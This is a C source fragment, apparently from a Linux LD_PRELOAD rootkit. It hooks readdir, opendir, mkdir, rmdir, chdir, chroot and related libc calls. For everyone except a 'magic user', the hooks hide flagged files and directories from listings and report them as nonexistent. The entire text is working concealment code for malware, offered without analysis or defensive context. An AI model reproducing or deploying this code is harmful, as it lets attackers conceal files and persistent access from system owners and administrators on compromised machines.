struct dirent *readdir(DIR *dirp){
    char path[PATH_MAX], *dirpath;
    struct dirent *dir;

    hook(o_readdir, "readdir");

    do{
        dir = o_readdir(dirp);
        if(magic_user()) return dir;

        if(dir == NULL) continue;
        if(!strcmp(dir->d_name, ".\0") || !strcmp(dir->d_name, "/\0")) continue;

        dirpath = get_fdname(dirfd(dirp));
        snprintf(path, PATH_MAX, "%s/%s", dirpath, dir->d_name);
        free(dirpath);
    }while(dir && hxstat(path));
    return dir;
}
struct dirent64 *readdir64(DIR *dirp){
    char path[PATH_MAX], *dirpath;
    struct dirent64 *dir;

    hook(o_readdir64, "readdir64");

    do{
        dir = o_readdir64(dirp);
        if(magic_user()) return dir;

        if(dir == NULL) continue;
        if(!strcmp(dir->d_name, ".\0") || !strcmp(dir->d_name, "/\0")) continue;

        dirpath = get_fdname(dirfd(dirp));
        snprintf(path, PATH_MAX, "%s/%s", dirpath, dir->d_name);
        free(dirpath);
    }while(dir && hxstat(path));
    return dir;
}

int mkdir(const char *pathname, mode_t mode){
    hook(o_mkdir,"mkdir");
    if(magic_user()) return o_mkdir(pathname,mode);
    if(hxstat(pathname)){ errno=ENOENT; return -1; }
    return o_mkdir(pathname,mode);
}
int rmdir(const char *pathname){
    hook(o_rmdir,"rmdir");
    if(magic_user()) return o_rmdir(pathname);
    if(hxstat(pathname)){ errno=ENOENT; return -1; }
    return o_rmdir(pathname);
}
DIR *opendir(const char *pathname){
    hook(o_opendir,"opendir");
    if(magic_user()) return o_opendir(pathname);
    if(hxstat(pathname)){ errno=ENOENT; return NULL; }
    return o_opendir(pathname);
}
DIR *opendir64(const char *pathname){
    hook(o_opendir64,"opendir64");
    if(magic_user()) return o_opendir64(pathname);
    if(hxstat(pathname)){ errno=ENOENT; return NULL; }
    return o_opendir64(pathname);
}
DIR *fdopendir(int fd){
    hook(o_fdopendir,"fdopendir");
    if(magic_user()) return o_fdopendir(fd);
    if(hfxstat(fd)) { errno = ENOENT; return NULL; }
    return o_fdopendir(fd);
}
int chdir(const char *pathname){
    hook(o_chdir,"chdir");
    if(magic_user()) return o_chdir(pathname);
    if(hxstat(pathname)){ errno=ENOENT; return -1; }
    return o_chdir(pathname);
}
int fchdir(int fd){
    hook(o_fchdir,"fchdir");
    if(magic_user()) return o_fchdir(fd);
    if(hfxstat(fd)){ errno=ENOENT; return -1; }
    return o_fchdir(fd);
}
int chroot(const char *path){
    hook(o_chroot,"chroot");
    if(magic_user()) return o_chroot(path);
    if(hxstat(path)){ errno=ENOENT; return -1; }
    return o_chroot(path);
}
